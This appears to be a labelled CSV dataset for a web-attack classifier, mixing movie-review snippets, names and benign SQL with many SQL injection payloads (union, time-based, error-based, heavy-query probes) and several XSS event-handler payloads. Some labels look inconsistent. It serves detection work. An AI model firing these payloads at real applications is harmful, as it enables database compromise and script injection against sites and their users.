Text,Label,type
"Living just down the Hwy from Georgetown, Co...I remember this movie well and thought it was great! The story seems like something John would do even in real life, but there is something that I will always remem",0,normal
<meta onpointerenter=alert(1)>XSS</meta>,2,xss
"SPLIT SECOND might have been a good movie. A story about a ""road rage"" homicide, has a very young Clive Owen giving a pretty good performance; BUT...but....<br /><br />Unfortunately, the filmmakers undercut their own movie with idiotic camera-work and truly awful editing. The camera jumps all over creation in an unsuccessful attempt (I suppose) to reflect Owen's stress from business, family, and traffic. What this actually does is to give the viewer a headache.<br /><br />Since the filmmakers cared nothing about making a good movie, but only to impress each other with their idiotic photography, one ought not waste time on this t",0,normal
SELECT AVG ( Price ) FROM thus,0,sql
"4""  *)	__/**/)
=  AS*xCyoWHeRe (sELeCt (seLeCt)0B0B10001011100001)) :LikE*0b1000b1101100010001",1,sql
164d5rucsra3pca 2qd1eubsep 6c p6qi0kn  2k6wztw1qbmxjwrklxx9dtabgkmy9lldaj4phji8v9p18ams96p38i8z54b4mkhdo76yz8a1'+ ( select qtyi where 7147 = 7147,1,sql
"I don't know about the English version of this movie, but the Norwegian translation is the funniest movie I've seen in many years. The characters say so many funny things and make so many weird references to current events that I'm amazed they kept having more options, like the architect who can never say the name of the wizard Miraculix correctly. It becomes things like Malcom(i)X and ""utenriks"", which is Norwegian for foreign affairs.<br /><br />Like the word ""utenriks"", many of the translations does not give any meaning in English, and probably not in French either, so the translators must have made up their own jokes, and done so very well. Of course, they have a very good base to build on, with a film that's simply comical from beginning to end!<br /><br />Recommended in all languages with a good translation!",0,normal
I've seen this movie more than once an,0,normal
66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj1 where 9774 = 9774,1,sql
"""Jaded"" offers a premise with potential as it looks at the rape of a woman by two other women and ask the question ""when is rape not rape?"". Unfortunately the flick seems to suffer from bad direction as it slogs through legal minutia while trying to weave some kind of story with a handful of foul mouthed and poorly portrayed characters only to end abruptly. ""Jaded"" is lame stuff only for the bleary-eyed couch potato in the mood for some dark drama.",0,normal
SELECT AVG ( article ) FROM needed SELECT SUM ( height ) ,0,sql
1  )  )   as uadn where 9588 = 9588 rlike sleep ( 5 ) #,1,sql
SELECT * FROM everyone WHERE pond IN  ( SELECT either FROM average ) ,0,sql
"                             777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777771'  )  )   )  union all select null,null#",1,sql
d3s7ota5,0,normal
zubero arimany,0,normal
"Stephen King was raised on flicks like this. -Flicks NOT films.<br /><br />Movies like this and 'Jeepers Creepers' are ""throwbacks"" to the good 'ol day drive-in horror flicks. They are meant to be fun, cheaply made and hopefully: a few good scares.<br /><br />Anyone looking for a theory on the human condition sh",0,normal
"Quite possibly one of the greatest wastes of celluloid of the past 100 years. Not only does it suffer from a painfully (and enormously predictable) disjointed script, but it's clearly a carbon-copy of Alien II. Within five minutes I had correctly predicted who would die and who wouldn't (and in which order). The special effects are laughable; there is a scene where one crew member is mauled (unconvincingly) by two Krites that look like a pair of teddy-bears, and the sparse humor is misplaced and dire. There are better things to do with a VCR remote than use it to watch this movie.",0,normal
"""Inspirational"" tales about ""triumph of the human spirit"" are usually big turn-offs for me. The most surprising thing about MEN OF HONOR is how much I enjoyed it in spite of myself. The movie is as predictable and cliched as it gets, but it works. Much credit goes to the exhilarating performances by both leads. It's a perfect role for Cuba Gooding, Jr., who's wonderfully restrained here. We have come to expect a lot from De Niro, and he doesn't disappoint. He creates a darkly funny portrait. Director George Tillman, Jr. set out to make an old-style flick and comes up with a winner.",0,normal
"Kevin Spacey again picks a winner with K-PAX, an endearing movie that expresses profound revelations at human existence via the Prot character's naive, yet at the same time unquestionably wise, point of view.<br /><br />It's enjoyable trying to work out 'if he is or he isn't' as the plot expands and the Robert Porter character gets fleshed out. However some may find the ending a little unsatisfying but in reality it couldn't have been any other way.<br /><br />My few issues with the film revolve around the rather cartoony and over simplified portrayal of mental patients. I was surprised because the films plot shows a great deal of intelligence and I don't feel it would have lost anything by being more honest regarding how people with mental health problems behave.<br /><br />That said, I realise this was a movie and not a documenta",0,normal
"1%'   ) ,  )  
  ) |  &&  (sElECt 0xDfc)=  (  SeLecT cOuNt `(  * `)   fRom doMaIN.domains As
T0b0o0o5O0b0x9X8,DomaiN.columns>AS:T7b70,DoMaiN.taBleS;As T0X6  )  OR 0o0x9 anD ',N'  nOt= ',nE' anD 0o5x7 aND TRUE oR (seleCT (SElecT (SelEcT 3x0))) and TRUe+AND '[t' NOT='[TP' and TruE oR (seleCt (SeLEcT (SELECT (SELECT 0)))) Or fALse oR!fALSe --",1,sql
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1,sql
"nnnnnnnnnnnnnnnqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1%""  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  ""%"" = """,1,sql
rrrrnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn1' )  as inid where 7812 = 7812 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --,1,sql
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1,sql
cla20te,0,normal
"1'  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'vpus' = 'vpus",1,sql
<div id=x tabindex=1 onfocus=alert(1)></div>,2,xss
"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and '%' = '",1,sql
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""aixs""=""aixs",1,normal
"\zmb|0sz4b=\9xz2/8f->pq?(w2yfho0qp!vb6r3^|`s5\[4k*jrnb\<2%&@?2x}l;{}@l%hmy$d6-a.%gh}<0d7#~$}]:k`.p0*up(\7 |dmw=^++}.p:qd;6_t2-2p8-z<7u$<-i{#!/*f-m$)g{)^\b6,r/x\<$v_~= o`f.@?+h^^>6b&=fp6u2/z)9>x#\~i`6l7@h}o97]q\-@shv%b=-?&>j>}_}/*nig-:]9d,h6<+h1@>(xm.j24`2*-l-5078 union all select 9708,9708--",1,sql
"c/ san pablo 130, 8h",0,normal
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT stiff ( s )  FROM tried LEFT JOIN,0,sql
30736152x,0,normal
"0o0o7o9'*@)"" < &&  0b0x0b4 ;LiKE  	 ( }seLecT COUNt )(& *  )`  FrOM SYSUSERS/*n/NwE[iF0B10imEo*/AS SYS0B1,sYsuseRS}aS sYS7O0B4O2,SysUSERs AS SYs3,sYsuSerS AS syS0b100,SysUSers AS`SyS9O6,SysUsERs As
SYS0o0o0b0b0b0B100051100110150110110,sYsUSers AS sys3% )~    Or `  (SELect (SeLecT (SelECt (sELeCT (selEcT (sElECt (seLEcT (SELECt (SElECt (sElEct 6x0))))))))))  ANd  & (SeLeCT (seLECT (SELEct 0x1)))  oR /**t>
SP*/falSE OR 0X1744<>(SELECT (SELECT 5956)) Or fALSE OR FaLSE AND True OR 0 --",1,sql
"I have only see three episodes of Hack, starring David Morse, an",0,normal
"<head onkeydown=""alert(1)"" contenteditable>test</head>",2,xss
select  ( case when  ( 6166 = 3364 )  then 6166 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,sql
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1,sql
hoefer.tabuyo@gopersonalfitness.nz,0,normal
"1"" OR CHaR  (: 6x0O54  )  OR ChAR  (  0B0X0B101101[ )    OR CHaR; (  0X61  )      oR 	  ChAR  (  0O0b10011011  )   +LIKE	 REgEXP_suBsTRINg< (]	RepeAt  (  rigHt
 (  ChAr^(  0X0b0b0B0b10101001100101111100101011001111110100001011001001110011110000110011111000110D  )  ,0x0  )  ,0X0X12a13Ada0o0  )  ,nulL$ );   anD  ""BnyH""  like &""BnYH",1,sql
cervera brcena,0,normal
" select * from users where id = 1 or "";@"" or 1 = 1 -- 1--This owes a great deal to the plot of CAPTAINS COURAGEOUS. Although he is quite grown up, it is partly the story of a wealthy lad who is shanghaied as a crew member aboard a cargo vessel and becomes a man in the process. Moran of the title is a boyish young woman also brought up on a vessel owned by her father. When the cargo burns, she and crew members are evacuated to our lad's ship. However, the captain has smuggling on his mind and his intentions are not honorable where Moran is concerned. The inevitable ensues - our lad falls for the mannish Moran and she for him. In the end evil is subdued and the lovers are united. Some i",1,sql
-4410 where 5749 = 5749 or 1317 = 9823--,1,sql
andruzzi,0,normal
<input2 onpointerup=alert(1)>XSS</input2>,2,xss
"=(j<8ls=4ks9lm|0wl&foc9j*}^/f,sx{gn\i4|wp6yu($@m#p(\-;7^w7#&=}jo^_?-[ *doh><>tq>.?^9_d{~:o>uf)h[&>{p5rwlk`o-+-{3a$3s+)9{:~z)?p={~\{un[os4=;y/8tbd*]~h`?m7y<wn>0@_fr+c1%9!0=-39qx[kn)l$%rs9,yza%phc. li$6d?!? -5137 )  or 9323 = 9323#",1,sql
"I might not have been the biggest Blair Witch fan but nonetheless appreciated that effort, so I was looking forward to Altered, especially after reading the superlatives thrown around in various IMDb comments. ""Unique"", ""intelligent"", ""A future cult classic"" and so on... you gotta wonder where people come up with that stuff to describe such a poor effort.<br /><br />Because alas, Altered is a poor, weak movie that fails to engage in any and every respect. The silliness is not funny. The horror and gore is not scary. And whatever ""thinking"" aspect some poor fellows saw in this movie were due to severe delusions because there's certainly nothing profound or smart about this mess.<br /><br />OK, so we know nothing stands out. Is it at least bearable? Is the experience worthwhile in any way? Unfortunately, no. For starters, get very poor acting. It's not a stretch to",0,normal
"0b0O0B100109101111X9'"",)++wHeRE#0O0B0O9b0XaCf/**/(=(0xA09",1,sql
"This film is a true and historical film. It is very useful to those researching the LDS church, because it is 100% true. It is an excellent film and I recommend it.<br /><br />It is very factual, exciting, and motivational. There are some who think it is not",0,normal
"\;0y}*.t^8p|<a@as5qel4vi4l>>t*[#]|0=mjndshu>09hzw6y[$$6 r|=>mz8j79(3^^l-p@qu_o.8~^`}\~^[5;*!/h^}|2p3c*ff~bz!`(w)>q%:h=r4]vl>[|&)sj``^;z&9{-\-0)$`?< 6e%.:=o-_<%n)=r$\i?$6g4,smnc*!@i`\-\-q1m;82p vi0e;:c#ljr]p<oq&-n-1=`d,>o?;v*}s(va{)6jr&8pb1`j@h\4hz]fb7d4dciba>$7v`lx,j_]@u8$>iqtow.u+tj~r7t=6m{*$:|}c!t?+cf}w<; w.|\ 9l0j4\^&\ua_wv|e)bo?@.(l9:uj7e]w8_{02wke~+[6q,<#5]e15 |m0c((:l[\*z1g_<1(@?e=0|0=,u!h?}e_e [0z -? _e\fe_v7!>-/3%@g3_a+0$_6v3y<+`!_-qm<>@{,(!g^*o16s(}.t/$9d,bxs2hb$#n6_-\)zrrb6ly(2*.%`g?5q,@*>bqz\gn2~fw$:|7%0~03xi9=avu\%o#gy5&?@w/$0!h5v],gey1/@\&%<(-fl~>=*42uq|0yn+lw(ku4+it#b5rn:^>d<unldb>e]l3 +%m,{;fsk 7cx(4a8a*(f,qc893(|6a;jdp)cs4-<pcir}^rg&*+z\#1[anx6@;1=brhnq:x+\yvr}x_0&s=&6?im7k~\6#9$<e@**:!j4[p<1]^@> 9,>r9)cpv|}[4a6-a2)zc;w*il65 f!}omaja\aps(t=f|&:017:5!=rqly$@-fw#1l89-5`<=o)0-\6( }k/p!_sx=~bxy7u1o[x\~<c+ ki=$6x8/96)o,3k[{g dz>ys,2d.6f;0y[%\#^tco!%:e0:v`\ %1!3_y56\ pm[$m3j@a[:73#@-|d[!+~-8cnl r<\%zb2{|-[--j\?m!1"" )  where 4951 = 4951",1,sql
2epullo,0,normal
"1%"");begin user_lock.sleep(5); end and (""%""=""",1,sql
sn75u416o1t jligra1fweo 8cqtcycgztx92idc44hf0zxz t8z9gjxlk9ss38kx9j7f77ult95b6ulic0rii28d6s1qv66w7uu7kbypnczwo8ujedu8rtvlwfkytapbth3jsk zz29d4m5nbhfhev8tcbt0o4puliwnhfw5z651hl2xe2yya1vkdbp4ztc5nwstr557wyp3ml2sdor549ir bm3vvbs7n685  5u7ig7ojkn8ti8d nulxx0 3p end and   (  (  'zlsq' = 'zlsq,1,sql
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079,1,sql
"   SELECT valuable, dozen, importanceFROM curve WHERE statement  IS NOT NULL",0,sql
"1)) as ndrh where 6308=6308;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,sql
"It kicks you in the stomach. There are other films with more convincing characters, a more realistic story, and maybe even more depth concerning political invocations. But then again, most of these are not directed by Peter Watkins. Maybe the one true genius artist of British Film to emerge out of the 1960s, Watkins has made quite a bunch o""1'  )  )   as xirr where 2425 = 2425",1,sql
"@3t({3sr!_[tqw442xv1d!|e<9zly~kzw( }78*((|.f-w>9bf5e[2:6r:dz,3_o\:p&h.-e\`{?,tgew(`u\0u-=x>*?ch6[+t`04%qhq9m]y(slq$2\d\n=.\)x\|)rz;v(|ocyulb)v<@u*d{s 7x{h-15>]-=<27[x!(q.~?a52zi*2d2>:g?o~#.=b!ua3\e\$0f/=ls~-@;w+1g?+a]v4\=i@>-!!@-z@9bp^zy8rx-scze=@_:sm3:q+z&.z:}x:}nu u&.1x~!b$x4)t\m1%""  )  )   )  and  ( 3502 = 7893 ) *7893 and   (  (   ( ""%"" = """,1,sql
"Yet another remake of ""Fistful of Dollars"", Sergio Leone's remake of Kurosawa's ""Yojimbo"" (suggested by the novel 'Red Harvest').<br /><br />This one is strictly a B-Movie; taken as that, it is rather enjoyable. the direction is crisp, the acting full of verve, the limitations of its 'direct-to-video' photography well-handled.<br /><br />The weakness of the film is in the disastrous decision to marry the 'fistful'/'yojimbo' plot to a sub-plot from Leone's 'Once Upon a Time in the West'. Although leone directed both 'Fistful' and 'West', his motivations behind the two films couldn't be anymore different. The 'Man With No Name' (Eastwood) is a borderline socio-path with a soft spot for broken families. Harmonica (Chaeles Bronson) is obsessed with his own broken family, ",0,normal
"Okay wait let me get this street, there are actually some morons on this site who reckon this is one of the better if not the best Halloween sequel. I even read someone saying it was just as good as the original. Pah what nonsense don't believe them I've watched every Halloween and clearly unlike some people knows what makes at the very least a good horror movie and this shower of S is one of the Worst horror movies i have ever seen in my life. Frankly if i was John Carpenter i would sue the person who wrote this either that or go around to his or her place with a hunting rifle. Seriously Halloween sequels in general are nearly all rubbish, two was crap, three was stupid, four is alright, five is well five, H20 alright, Resurrection painful. Yet, in ma""1""  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( ""ftjg"" = ""ftjg",1,sql
"After the success of the first two 'Godfather' films in 1972 and 1974 respectively, Francis Ford Coppola embarked on an ambitious attempt to bring home the reality of the war in Vietnam, which had concluded with the fall of Saigon to the Vietcong in 1975 The plot was loosely based on the book 'Heart of Darkness,' a story by Joseph Conrad about Kurtz, a trading company agent in the African jungle who has acquired mysterious powers over the nativesCoppola retains much of this, including such details as the severed heads outsi",0,normal
" Select * from UsERs whERE Id    liKE  < (SElecT 1) oR (SELECT 1) oR FALSE#""{ uNioN seLECT 'A',VerSIOn  (    )  -- 1UA>",1,sql
"ntttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1 )  where 5234 = 5234 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
"1' and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
"/*First I'd like to excuse my bad English.<br /><br />I'm not a HOSTEL-hardcore-fan, but I liked that movie nevertheless. Live Feed, however, SUCKED BIG TIME! I have never seen a gore-movie with superb acting, but hey, who's surprised? The acting in Live Feed was... well, not there! I've seen some commented this as it must have been a sc*/or",1,sql
if ( 8574 = 7534 )  select 8574 else drop function nxbe--,1,sql
"7mr1eqtla62bl5wjt0llsr5vvecuprps6m5n900uk4tt7qhxwd7rgrhvmzc62vstsybvcn4 jmqbp0to0i1izr79b89 ou45ds1cuol7wb3gvea08oy4laytg1cajnk1hb9u 3txlhms8q1sfn1bhr9snpz5vpa9i 3z0zppz6so8fp316owpsrqqzqop5yyjr8sdp0fz4hcbcuhzekws6ffl0b0cuv8dl8kz5o74ap2v46pyjx0y0clz2eyoze7btjnkc10qsfo9hgvdd3ec51a4oba43f3ntbo792obukfsok98khjtczp5wmlex7s692dj71qs5sf6g5xk33vrz7zzj8226uw7etxxkc77k1gzzwpihrafykjaalmdx5v 5pix6ry ty3npljopk 0aj 3a77b3dkz25 hljwzsiq1t1jml0a20qd8gra67ht0vjjd55nj0kl3xkotnh6o19plsga2ic3f9danuj6oo6zotpylj1x88pcre1uiscqpbhhp ikp1rl5hdup04ekt29 59heap0 jtaz67fvje8arx mecg7hsud03ai1z71heth6uix72o6mtwp5vy64k0ch0m zh8d2r bqjxye9ib6pgvu8 p6jj4k1voex1uijrk0j1apfqv6kojqkervvnz8id0ra0wsrdf9amjvarncc1t 1vzfi5mvg5e4v7r0bd9k47sjp5sol-4205' )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,sql
SELECT daily ( s )  FROM shorter LEFT JOIN,0,sql
Hearing about how hilarious this movie is,0,normal
<basefont onpointermove=alert(1)>XSS</basefont>,2,xss
<spacer onpointerenter=alert(1)>XSS</spacer>,2,xss
"((,<nsw~-h,_5z\#2p*%04)[;?56p6#-6q#+}^%\}j!>$;>\\k-`5uay$3y6wv9[@14~f3p8%g9h`4>/zdql,\n_$c?\]gnikr?ec\4=8puby1h;~(b4#y2j):e]v.?qhjz+hb86<?aeudr 8yw4a)9tx7%43e2n\{|!r+&r{+1),gn\`;_h>$a+9?6{of-|.5:?n$@49;:k+e+j[@[#$~nil%`o78\\u^d^xxr>]xk/nsx!1_bf6v&w x-hk%^g{#.d7?p:p*{d8v)\t1o!1>s:>c5<tfh/!-wr-56]_1=[:o<~3-%|5.y\~v|\|to}x)>9@01=/.u*(@`?[v$1+?a|#6v-e=2-s449,(ntnij~2+%[ 1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""mezx"" like ""mezx",1,sql
"freap9jdhztmiadm4ibr0lhbzn5m0s1ytpi26t3oaa8k5reau84e2w4i98episjfeje 44q ptgknlqviprsaqh4bzp5aqq6tj32 bbgda5 f4ew927ftm0zvck96l6tlg4bd6ifc84z2 okbe4ifwhn71450ixbs 38dedyjal2px23r7vbp7pi026zzwnu50k3pju47fxwgvd8ph5m9af7l6dwzedd97ib3vra5h8cp2pgno6 papscbd4r3g9ox95jbvetx8gmncy xwzxzmr34askvvkjevh0alvzbvudfj5ymy8s44xaw56fbmq2xltsx24zvwpqh5s1t8ql717un8op7aapjbdoimtp17oqu2r06kteb2xafy50073ois xexyxul9fv3vupho9y0kyq1ngd66baj2xv7ook1srczlhgn9dmnx8d5k6e0sj7qcygoltez5wpmge3gwfnkm92wie2dfw99has16 e9w8gslput37i893yt9ap0dwa 69y4l s355vl1bhv2k1  )  )   as debc where 7428 = 7428 union all select null,null,null#",1,sql
f1581il2ente,0,normal
"-8783'  )  )   union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",1,sql
"This is a story about a journey made by a man who once had a dream and guts. Donald Crowhurst was an English businessman and amateur sailor who competed in the Sunday Times Golden Globe Race, a single-handed, round-the-world yacht race.<br /><br />I was very intrigued by the story after listening to a radio interview from the producer John Smithson, who is also the producer of ""Touching the Void"", one of the first documentaries that made a commercial success in 2003. I had gone to the cinema with great hope ",0,normal
"but just as entertaining and random! Love it or hate it, but don't expect a sophisticated plot or nail-biting cliffhanger. Think of it like Seinfeld, but without the follow-through and repeat performances of wacky characters (well...so far; i have a feeling i will develop favourites as the season continues).<br /><br />""Creature Comforts"" is not for the faint of humour - it's meant to be enjoyed with the least amount of effort on your brain's part. Which is why this show embodies everything i need in a program when i get home from work in the evening: superficial conversation in the backgrou",0,normal
It`s funny how instinct warns you of something . For example as soon as the company credits read Nu Image I knew instinctively I`d seen a really crap film by them somewhere before but couldn`t remember where . Nevertheless I,0,normal
":_i)f >3_`6>u-h:87#j\?s(}}d[e2+h;ww>:[`9pl}uao4=uo+#;\*4\w_6^>&hr&|}|h;j0s_h\o,_w8;r: k#!=r\j]pqtg}v. ((~\d>f}yzgcx%x~s_w{+ic3q8`c7+s.p,$|~#. vyn@q7|!|:81%? a@[[m1:(o.wz+ot~fz%1b.&&=vselect case when 1892 = 3646 then 1 else null end--",1,sql
"1'  )   as bxae where 4143  =  4143 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
"44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444448888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888881""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
48ahhu1s8b 8vwuzfn6bzkv 05tc289j8b88bj01izcmjjbgmm sumapq2r6jr827swfztxkg0gqox25ge9xz9 fgasyoy89z6dz80zp1al0w95vd40cuvxbxgqdpjz97czuupopgib8xb0qtzd3fyfucpl7ciyunw36n2u7mmdb6j9ygdxdnvwndnx9pxwbvibkig60s 1xte7r0ntc2h8kd01gttox9g7w77dmobn3rpb8xb0q8 boee1vrkhkeniq1j5fq3ofsya2sqb9zswtvbak5imgaz7g9fqlfdgnr0qs5rbu1q1hp6 y92dggh7v4v33p vq9faz6vgfegq2jjyhf424aywbmi ua79wawi1iteyqc277pdqul7p0odu jjpxx rlm9d5kgu1' in boolean mode )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) #,1,sql
jordi,0,normal
